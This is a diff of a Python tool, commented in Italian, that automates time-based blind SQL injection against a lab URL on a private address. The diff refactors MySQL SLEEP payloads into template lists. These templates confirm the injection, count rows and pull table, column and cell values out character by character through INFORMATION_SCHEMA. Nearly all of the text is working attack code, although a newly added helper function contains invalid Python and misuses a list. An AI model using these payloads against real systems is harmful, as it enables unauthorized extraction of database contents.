@@ -10,6 +10,47 @@ isGet = True
 #payload base
 #http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com
 
+#
+#    templates[0].format("boh", "bbb") -> "cabbbio boh"
+#    "ca{1}io {0}".format("boh", "bbb") -> "cabbbio boh"
+#    templates = ["table='{1}' {0}", "table={1} {0}"]
+
+# format(sleeptime, column_name, tabledb_name, row, underscores)
+templatesLength = [
+    "\' AND (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
+    "\' OR (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
+    "(SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4})"
+]
+
+#format(column_name, tabledb_name, row, pos+1, char, sleeptime)
+templatesCell = [
+    "\' AND IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
+    "\' OR IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
+    "IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))"
+]
+
+#format(tabledb_name, char, sleeptime)
+templatesNumRows = [
+    "\' AND IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
+    "\' OR IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
+    "IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0))"
+]
+
+#format(sleeptime)
+templatesTest = [
+    "\' AND SLEEP({0}) -- -",
+    "\' OR SLEEP({0}) -- -",
+    "SLEEP({0})"
+]
+
+def trovaindicetemplate (url, sleeptime):
+    for i in range (0, len(templatesTest)):
+        payload = templatesTest.format(sleeptime)
+        payload2 = "shishkebbab"
+        if(request(url, payload, sleeptime) || request(url,payload2,sleeptime)):
+            return i
+
+
 #Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
 def findCellValue(url, tabledb_name, row, column_name, sleeptime):
     print("findCellValue length")
@@ -27,14 +68,18 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
         
         #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
         if(isGet):
-            payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
+            #payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
+            payload = templatesLength[0].format(sleeptime, column_name, tabledb_name, row, concatStr)
         else:
 	        #TODO parametrizzare richiesta in POST
             payload={
-                'to':'(SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ")",
+                'to':templatesLength[2].format(sleeptime, column_name, tabledb_name, row, concatStr),
                 'msg':'msg'    
 	        }
-	    
+            
+            #to=cbdhasj&msg='vfdnj'
+            #template[0].format(retval)
+
             #print(payload)
 
         #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
@@ -50,13 +95,13 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
 
             #Nuovamente ricontrollo con che metodo invio le query
             if(isGet):
-                payload='\' AND IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))-- -'
+                payload=templatesCell[0].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
             else:
                 payload={
-                    'to':'IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))',
+                    'to':templatesCell[2].format(column_name, tabledb_name, row, pos+1, i, sleeptime),
                     'msg':'msg'
                 }
-                
+
             #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
             if(request(url, payload, sleeptime)):
                 string.append(chr(i))
@@ -72,10 +117,10 @@ def findNumRows(url, tabledb_name, sleeptime):
     numrows=0
     for i in range(1, 100):
         if(isGet):
-            payload = '\' AND IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0)) -- -'
+            payload = templatesNumRows[0].format(tabledb_name, i, sleeptime)
         else:
             payload={
-                'to':'IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0))',
+                'to':templatesNumRows[2].format(tabledb_name, i, sleeptime),
                 'msg':'cdef'
             }
 
@@ -120,8 +165,6 @@ def findColumnNames(url, dbname, tablename, sleeptime):
         cols.append(findCellValue(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), i, "column_name", sleeptime))    
     return cols
     
-#    templates = ["table='{1}' {0}", "table={1} {0}"]
-#    templates[0].format("boh", "bbb") -> "cabbbio boh"
 
 #stampa i nomi delle tabelle
 def findTableNames(url, dbname, sleeptime):
@@ -216,4 +259,3 @@ if(args.all is not None):
 if(args.db is not None):
     n=calcRitardo(args.db[0])
     findDbNames(args.db[0], n)
-
